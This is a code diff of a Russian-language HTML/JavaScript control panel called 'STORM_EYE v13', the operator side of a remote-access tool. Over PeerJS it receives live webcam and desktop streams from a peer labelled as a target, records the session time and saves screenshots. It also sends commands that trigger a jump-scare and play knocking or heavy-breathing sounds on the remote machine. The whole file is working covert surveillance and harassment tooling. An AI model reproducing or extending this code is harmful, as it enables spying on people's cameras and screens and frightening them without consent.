@@ -1,58 +1,130 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>TERMINAL v12</title>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
+    <title>S.Y.S.T.E.M. TERMINAL v13.0</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        #side { width: 300px; background: #0a0a0a; border-right: 2px solid #1a1a1a; padding: 20px; }
-        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; background: #000; overflow-y: auto; }
-        .v-box { border: 1px solid #333; position: relative; background: #111; }
-        video { width: 100%; height: auto; display: block; }
-        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 8px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; }
-        .btn:hover { background: #0f0; color: #000; }
-        #st { font-size: 18px; margin-bottom: 20px; color: #ff0050; }
+        :root { --main: #00ff41; --bg: #050505; --accent: #ff003c; }
+        body { background: var(--bg); color: var(--main); font-family: 'Consolas', monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
+        
+        /* Боковая панель управления */
+        #side { width: 320px; background: #0a0a0a; border-right: 2px solid #1a1a1a; padding: 25px; display: flex; flex-direction: column; box-shadow: 10px 0 20px rgba(0,0,0,0.5); z-index: 10; }
+        
+        /* Мониторы видео */
+        #monitor { flex: 1; display: grid; grid-template-columns: 1fr; gap: 15px; padding: 20px; background: radial-gradient(circle, #111 0%, #000 100%); overflow-y: auto; }
+        
+        .v-box { border: 2px solid #222; background: #000; position: relative; border-radius: 10px; overflow: hidden; box-shadow: 0 0 15px rgba(0,255,65,0.1); transition: 0.3s; }
+        .v-box:hover { border-color: var(--main); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
+        
+        video { width: 100%; height: 100%; object-fit: contain; display: block; background: #000; }
+        
+        .label { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 5px 12px; font-size: 12px; border: 1px solid var(--main); border-radius: 5px; text-transform: uppercase; }
+
+        /* Кнопки */
+        .btn { padding: 15px; width: 100%; cursor: pointer; margin-bottom: 12px; border: 1px solid var(--main); background: transparent; color: var(--main); font-weight: bold; font-family: inherit; transition: 0.2s; outline: none; }
+        .btn:hover { background: var(--main); color: #000; }
+        .btn-red { border-color: var(--accent); color: var(--accent); }
+        .btn-red:hover { background: var(--accent); color: #fff; }
+
+        #st { font-size: 14px; margin-bottom: 25px; border-bottom: 1px solid #222; pb: 10px; }
+        .scanline { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0,255,65,0.1); animation: scan 4s linear infinite; pointer-events: none; }
+        @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
 </head>
 <body>
+    <div class="scanline"></div>
     <div id="side">
-        <div id="st">● OFFLINE</div>
-        <button class="btn" style="color:#ff0050; border-color:#ff0050;" onclick="send('SCR')">💀 СКРИМЕР</button>
-        <button class="btn" onclick="takePhoto()">📸 СКРИНШОТ</button>
-        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
-        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
-        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/error_CD7797S.mp3')">⚠️ ОШИБКА XP</button>
+        <h1 style="font-size: 22px; margin: 0 0 10px 0; color: var(--accent);">STORM_EYE v13</h1>
+        <div id="st">STATUS: [ <span id="st-text" style="color: var(--accent)">OFFLINE</span> ]</div>
+        <div id="timer" style="font-size: 24px; margin-bottom: 30px;">00:00:00</div>
+
+        <button class="btn btn-red" onclick="send('SCR')">☣ ЗАПУСТИТЬ СКРИМЕР</button>
+        <button class="btn" onclick="takeSnapshot()">📸 СДЕЛАТЬ СКРИНШОТ</button>
+        
+        <p style="color: #444; margin: 20px 0 10px 0;">AUDIO INJECTOR:</p>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК В ДВЕРЬ</button>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ТЯЖЕЛОЕ ДЫХАНИЕ</button>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/discord-notification.mp3')">💬 УВЕДОМЛЕНИЕ</button>
     </div>
-    <div id="monitor"></div>
+
+    <div id="monitor">
+        </div>
 
     <script>
-        const peer = new Peer('SUPER_STABLE_99');
+        const MY_ID = 'GLOBAL_TARGET_V12';
+        const peer = new Peer(MY_ID);
         let activeConn = null;
 
-        peer.on('open', () => { document.getElementById('st').innerText = "● READY"; document.getElementById('st').style.color = "#0f0"; });
-        peer.on('connection', c => { activeConn = c; document.getElementById('st').innerText = "● CONNECTED"; });
+        peer.on('open', () => {
+            const st = document.getElementById('st-text');
+            st.innerText = "WAITING";
+            st.style.color = "#f1c40f";
+        });
+
+        peer.on('connection', conn => {
+            activeConn = conn;
+            document.getElementById('st-text').innerText = "LINK ESTABLISHED";
+            document.getElementById('st-text').style.color = "#00ff41";
+            startTimer();
+        });
 
         peer.on('call', call => {
             call.answer();
             call.on('stream', stream => {
-                const div = document.createElement('div');
-                div.className = 'v-box';
-                const v = document.createElement('video');
-                v.autoplay = true; v.srcObject = stream;
-                div.appendChild(v);
-                document.getElementById('monitor').appendChild(div);
+                addStream(stream);
             });
         });
 
+        function addStream(stream) {
+            const monitor = document.getElementById('monitor');
+            const box = document.createElement('div');
+            box.className = 'v-box';
+            
+            const v = document.createElement('video');
+            v.autoplay = true;
+            v.muted = true; // Важно для автозапуска
+            v.playsinline = true;
+            v.srcObject = stream;
+            
+            // Умная метка потока
+            const label = document.createElement('div');
+            label.className = 'label';
+            const hasAudio = stream.getAudioTracks().length > 0;
+            label.innerText = stream.getVideoTracks()[0].label.toLowerCase().includes('screen') ? '📡 DESKTOP' : '📷 WEBCAM';
+
+            box.appendChild(v);
+            box.appendChild(label);
+            monitor.appendChild(box);
+
+            // Переключение сетки
+            const vids = document.querySelectorAll('video').length;
+            monitor.style.gridTemplateColumns = vids > 1 ? "1fr 1fr" : "1fr";
+            
+            // Принудительный старт
+            v.play();
+        }
+
         function send(t) { if(activeConn) activeConn.send({ type: t }); }
         function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
-        function takePhoto() {
+
+        function takeSnapshot() {
             const v = document.querySelector('video');
+            if(!v) return;
             const canvas = document.createElement('canvas');
             canvas.width = v.videoWidth; canvas.height = v.videoHeight;
             canvas.getContext('2d').drawImage(v, 0, 0);
-            const a = document.createElement('a'); a.download = 'shot.png'; a.href = canvas.toDataURL(); a.click();
+            const a = document.createElement('a'); a.download = `IMG_${Date.now()}.png`; a.href = canvas.toDataURL(); a.click();
+        }
+
+        function startTimer() {
+            let s = 0;
+            setInterval(() => {
+                s++;
+                let m = Math.floor(s/60).toString().padStart(2,'0');
+                let sec = (s%60).toString().padStart(2,'0');
+                document.getElementById('timer').innerText = `00:${m}:${sec}`;
+            }, 1000);
         }
     </script>
 </body>
